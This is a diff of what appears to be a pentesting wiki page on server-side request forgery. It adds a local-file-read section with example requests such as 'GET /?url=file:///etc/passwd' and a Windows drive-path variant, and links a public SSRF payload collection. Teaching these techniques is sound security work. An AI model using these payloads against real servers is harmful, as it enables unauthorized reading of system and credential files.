@@ -50,13 +50,12 @@ However, if there is a <mark style="color:yellow;">blind SSRF</mark> present, yo
 <figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 * Be sure to look for other unusal elements in the request as this can lead you to possible SSRF
-*
 
-## Attack Vectors
+## Local File Read
 
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#tools" %}
+* SSRF can only access or read files using the file:/// protocol
 
-### File Schema:&#x20;
+<mark style="color:red;">Local File Read Examples:</mark>&#x20;
 
 <mark style="color:yellow;">`GET /?url=file:///etc/passwd HTTP/1.1`</mark>
 
@@ -65,3 +64,13 @@ However, if there is a <mark style="color:yellow;">blind SSRF</mark> present, yo
 <mark style="color:yellow;">`GET /?url=file:/PathToFile`</mark>
 
 <mark style="color:yellow;">`GET /?url=file://hostname/PathToFile`</mark>
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+If the web application is deployed on a <mark style="color:yellow;">Windows server</mark>, you can access files using the file:/// protocol as well! You just need to use file:///\<drive_letter/path-to-file_&#x20;
+
+Example: <mark style="color:yellow;">file:///d:/hello.txt</mark>
+
+## Attack Vectors
+
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#tools" %}
